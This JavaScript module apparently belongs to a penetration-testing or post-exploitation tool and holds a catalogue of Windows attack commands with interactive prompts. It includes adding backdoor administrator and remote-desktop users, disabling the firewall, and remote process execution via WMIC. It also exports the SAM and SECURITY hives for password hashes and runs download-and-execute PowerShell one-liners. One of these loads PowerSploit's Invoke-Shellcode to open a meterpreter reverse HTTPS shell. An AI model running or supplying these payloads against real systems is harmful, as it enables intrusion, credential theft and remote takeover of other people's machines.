var prompt = require('prompt'),
	M = require('mstring'),
	ask = require('../modules/questionUser');

// Initialize array and Payload Helper

arrayWin = []

var Load = function(obj){
	arrayWin.push(obj);
}

// Question helper method
var questions = [];
var question = function(val){
	questions.push(val);
}

/*
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)

	Ex:

	callback: function(bro){
		question.ask("Do you even ...?") // Ask the user something, return value will be entered as PROMPT value
		question.ask(ask.http) // Ask user if they want to start a webserver after the payload is printed
	}


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis

	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>


*/


// ############### System Info ######################

Load({ payload: "ver", desc: "Get OS version", category: "System Info"})
Load({ payload: "echo %USERNAME%", desc: "Get current user", category: "System Info"})
Load({ payload: "sc query state=all", desc: "Show services", category: "System Info"})
Load({ payload: "tasklist /svc", desc: "Show processes & services", category: "System Info"})
Load({ payload: "tasklist /m", desc: "Show processes & DLLs", category: "System Info"})
Load({ payload: "net localgroup administrators", desc: "Prints local admins", category: "System Info"})
Load({ payload: "net session", desc: "Check for elevated rights (an access denied error will return if not elevated)", category: "System Info"})
Load({ payload: "net user <PROMPT (username)> <PROMPT (password)> /ADD", desc: "Create new local user",callback: function(bro){question("What user would you like to add?");question("What password would you like to use?");ask.some(questions, bro);}, category: "System Info"})
Load({desc: "Add user to local admins group",payload: "net localgroup administrators <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
Load({desc: "Add user to remote desktop group",payload: "net localgroup \"remote desktop users\" <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});



Load({
	payload: "taskkill /PID <PROMPT (pid)> /F",
	desc: "Force process to terminate",
	category: "System Info",
	callback: function(bro){
		question("What PID would you like to terminate?");
		ask.some(questions,bro);
	}
})

Load({
	payload: "reg query HKLM /f <PROMPT (search term)> /t REG_SZ /s",
	desc: "Search registry for value",
	category: "System Info",
	callback: function(bro){
		question("What term would you like to search for?");
		ask.some(questions,bro);
	}
})


// ############### File System ######################


Load({
	title: "Windows Common Files",
	payload: "A quick look at common windows files\n",
	category: "File System",
	callback: function(bro){
		var m = M(function(){
		/***

		%SYSTEMROOT%								Usually C:\Windows
		%SYSTEMROOT%\System32\drivers\etc\hosts					DNS entries
		%SYSTEMROOT%\System32\drivers\etc\networks				Network settings
		%SYSTEMROOT%\System32\config\SAM 					Password hashes
		%SYSTEMROOT%\repair\SAM 						Backup copy of SAM file
		%SYSTEMROOT%\System32\config\RegBack\SAM 				Backup copy of SAM file
		%SYSTEMROOT%\System32\config\AppEvent.Evt   				Application Log
		%SYSTEMROOT%\System32\config\SecEvent.Evt 				Security Log
		%USER%\Start Menu\Programs\Startup 					Startup Location
		%SYSTEMROOT%\Prefetch 							EXE logs

		***/})

		console.log(m)

		prompt.message = "Press enter to continue"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			bro(1)
		})


	}
})

Load({
	desc: "Find string in file",
	payload: "find /I '<PROMPT (search string)>' <filename>",
	callback: function(bro){
		question("What search term would you like to use?");
		ask.some(questions, bro);
	},
	category: "File System"
});

// ############### Networking ######################

Load({payload: "ipconfig /all", desc: "Get all network interfaces", category: "Networking"})
Load({payload: "ipconfig /displaydns", desc: "Get dns configuration", category: "Networking"})
Load({payload: "netstat -r", desc: "Display routing table", category: "Networking"})
Load({payload: "netstat -nabo", desc: "Lists ports / connections with corresponding process", category: "Networking"})
Load({payload: "netstat -na | findstr :445", desc: "Find listening connections on specific port", category: "Networking"})
Load({payload: "net user /domain", desc: "Lists all of the domain users", category: "Networking"})
Load({payload: "net group \"Domain Admins\" /domain", desc: "Prints list of Domain Admins", category: "Networking"})
Load({payload: "net group \"Domain Controllers\" /domain", desc: "Prints the list of Domain Controllers for the current domain", category: "Networking"})
Load({payload: "netsh firewall set opmode disable", desc: "Disable Windows Firewall", category: "Networking"})
Load({payload: "netsh winhttp set proxy \"<RHOST (ex: proxy.foobar.com:8080)>\"", desc: "Configure an HTTP Proxy", category: "Networking"})

// ################### WMIC ######################

Load({payload: "wmic qfe get hotfixid", desc: "Get Patch IDs", category: "WMIC"})
Load({payload: "wmic OS get Caption,CSDVersion,OSArchitecture,Version", desc: "Get OS Information", category: "WMIC"})
Load({payload: "wmic process list full", desc: "List all processes and their attributes", category: "WMIC"})
Load({payload: "wmic ntdomain list", desc: "Get Domain and DC Information", category: "WMIC"})
Load({payload: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct", desc: "List Anti-Virus Product(s)", category: "WMIC"})
Load({payload: "wmic /user:<PROMPT (username)> /password:<PROMPT (password)> /node:<RHOST> process call create \"cmd.exe /c <PROMPT (payload)>\"", desc: "Execute a process remotely", category: "WMIC",
		callback: function(bro){
			question("Enter the username");
			question("Enter the password");
			question("What payload would you like to execute?");
			ask.some(questions, bro);
		}
})
//

// ############### Powershell ######################

Load({
	title: "TCP Port Scan",
	payload: '$ps=(<PROMPT (ports)>);$ip="<RHOST>";foreach ($p in $ps){try{$s=New-object System.Net.Sockets.TCPClient($ip,$p);}catch{};if ($s -eq $NULL){echo $ip":"$p" - Closed";}else{echo $ip":"$p" - Open";$s = $NULL;}}',
	category: "Powershell",
	callback: function(bro){
		question("Ports to scan? (ex: 80,443,8080)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Download File",
	payload: '(new-object system.net.webclient).downloadFile("<PROMPT (URI)>","<PROMPT (local path to save to)>")',
	category: "Powershell",
	callback: function(bro){
	    question("What is the full URI path of the hosted file? (ex: http://foo.bar/bro.zip)")
			question("Where would you like to save it? (ex: C:\\TEMP\\bro.zip)");
	    ask.some(questions, bro);

	}
})

Load({
	title: "Download and Execute Remote PSH Script",
	payload: 'IEX (new-object net.webclient).downloadString("<PROMPT (URI)>");',
	category: "Powershell",
	callback: function(bro){
	    question("What is the full URI path of the hosted PSH script? ")
	    ask.some(questions, bro);
	}
})

// Credit => http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html
Load({
	title: "Simple HTTP Server",
	payload: 'Write-Host "Starting Web Server";$H = New-Object Net.HttpListener;$H.Prefixes.Add("http://+:<LPORT>/");$H.Start();While ($H.IsListening) { [console]::TreatControlCAsInput = $true;while ($true){if ([console]::KeyAvailable){Write-Host "Testing";$key = [system.console]::readkey($true);if (($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "C")){Write-Host "Stopping Web Server";$H.Stop();break}}};$HC = $H.GetContext();$HR = $HC.Response;$HR.Headers.Add("Content-Type","text/plain");$Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)));$HR.ContentLength64 = $Buf.Length;$HR.OutputStream.Write($Buf,0,$Buf.Length);$HR.Close();}$H.Stop();',
	category: "Powershell"
})

Load({
	title: "Remotely download and execute PowerSploit's Invoke-Shellcode over https (ignore cert mismatch)",
	payload: '$w = New-Object Net.WebClient;[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX $w.DownloadString("<PROMPT>");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <LHOST> -Lport <LPORT> -Force',
	category: "Powershell",
	callback: function(bro){
	    question("Enter the full path of your hosted copy of PowerSploit's Invoke-Shellcode script ")
	    ask.some(questions, bro);
	}
})


// ############### Windows Registry ######################

Load({
	title: "Enable Remote Desktop",
	payload: "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
	category: "Windows Registry"
})

Load({
	title: "Export Windows Security Hives",
	payload: "reg SAVE HKLM\\SECURITY security.hive && reg SAVE HKLM\\SYSTEM system.hive && reg SAVE HKLM\\SAM sam.hive ",
	category: "Windows Registry"
})


/*
######################################################
############### End of Payloads ######################
######################################################
*/

module.exports = arrayWin;
